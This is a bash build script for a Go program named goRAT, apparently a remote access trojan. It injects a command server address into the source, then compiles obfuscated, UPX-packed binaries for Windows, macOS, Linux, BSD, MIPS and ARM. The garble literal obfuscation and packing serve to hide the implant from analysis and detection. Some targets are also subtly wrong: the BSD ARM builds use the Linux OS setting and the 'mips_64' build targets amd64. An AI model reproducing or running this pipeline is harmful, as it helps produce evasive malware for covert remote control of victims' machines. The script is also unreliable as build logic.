#!/usr/bin/env bash
source config.sh

# Vars and Flags
export PATH=$PATH:$(go env GOPATH)/bin
VERSION=`git rev-list --count HEAD`
BUILD_DIR="BUILD"
SRC_DIR=".BUILD_SOURCE"

# Source Files
CORE="goRAT.go"
COMPILE_CORE="$SRC_DIR/goRAT.go"

# Clean Before Stage
rm -rf $BUILD_DIR
rm -rf $SRC_DIR
mkdir $BUILD_DIR
mkdir $SRC_DIR

# Stage Files and Inject Vars Before Compile
cp $CORE $COMPILE_CORE
sed -i "s/@ENDPOINT_HERE@/$SERVER_DEST/g" $COMPILE_CORE

######################
## 64 Bit Systems
####################
GOOS=linux GOARCH=amd64 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_linux_64 "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_linux_64
GOOS=darwin GOARCH=amd64 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_macos_64 "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_macos_64
GOOS=windows GOARCH=amd64 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_windows_64.exe "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_windows_64.exe
GOOS=freebsd GOARCH=amd64 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_freebsd_64 "$COMPILE_CORE"
# RIP no UPX for freebsd
GOOS=openbsd GOARCH=amd64 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_openbsd_64 "$COMPILE_CORE"
# RIP no UPX for openbsd
GOOS=linux GOARCH=amd64 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_linux_mips_64 "$COMPILE_CORE"
# RIP no UPX for MIPS64

GOOS=linux GOARCH=arm64 GOARM=5 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_linux_arm64_ARM5 "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_linux_arm64_ARM5
GOOS=linux GOARCH=arm64 GOARM=6 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_linux_arm64_ARM6 "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_linux_arm64_ARM6
GOOS=linux GOARCH=arm64 GOARM=7 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_linux_arm64_ARM7 "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_linux_arm64_ARM7

GOOS=linux GOARCH=arm64 GOARM=5 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_openbsd_arm64_ARM5 "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_openbsd_arm64_ARM5
GOOS=linux GOARCH=arm64 GOARM=6 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_openbsd_arm64_ARM6 "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_openbsd_arm64_ARM6
GOOS=linux GOARCH=arm64 GOARM=7 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_openbsd_arm64_ARM7 "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_openbsd_arm64_ARM7

GOOS=linux GOARCH=arm64 GOARM=5 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_freebsd_arm64_ARM5 "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_freebsd_arm64_ARM5
GOOS=linux GOARCH=arm64 GOARM=6 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_freebsd_arm64_ARM6 "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_freebsd_arm64_ARM6
GOOS=linux GOARCH=arm64 GOARM=7 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_freebsd_arm64_ARM7 "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_freebsd_arm64_ARM7

######################
## 32 Bit Systems
####################
GOOS=linux GOARCH=386 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_linux_32 "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_linux_32
GOOS=darwin GOARCH=386 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_macos_32 "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_macos_32
GOOS=windows GOARCH=386 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_windows_32.exe "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_windows_32.exe
GOOS=freebsd GOARCH=386 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_freebsd_32 "$COMPILE_CORE"
# RIP no UPX for freebsd
GOOS=openbsd GOARCH=386 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_openbsd_32 "$COMPILE_CORE"
# RIP no UPX for openbsd
GOOS=linux GOARCH=mips garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_linux_mips_32 "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_linux_mips_32

GOOS=linux GOARCH=arm GOARM=5 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_linux_arm_ARM5 "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_linux_arm_ARM5
GOOS=linux GOARCH=arm GOARM=6 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_linux_arm_ARM6 "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_linux_arm_ARM6
GOOS=linux GOARCH=arm GOARM=7 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_linux_arm_ARM7 "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_linux_arm_ARM7

GOOS=linux GOARCH=arm GOARM=5 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_openbsd_arm_ARM5 "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_openbsd_arm_ARM5
GOOS=linux GOARCH=arm GOARM=6 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_openbsd_arm_ARM6 "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_openbsd_arm_ARM6
GOOS=linux GOARCH=arm GOARM=7 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_openbsd_arm_ARM7 "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_openbsd_arm_ARM7

GOOS=linux GOARCH=arm GOARM=5 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_freebsd_arm_ARM5 "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_freebsd_arm_ARM5
GOOS=linux GOARCH=arm GOARM=6 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_freebsd_arm_ARM6 "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_freebsd_arm_ARM6
GOOS=linux GOARCH=arm GOARM=7 garble -literals -tiny -seed=random build -o "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_freebsd_arm_ARM7 "$COMPILE_CORE"
upx "$BUILD_DIR"/"$EXE_NAME"_v"$VERSION"_freebsd_arm_ARM7
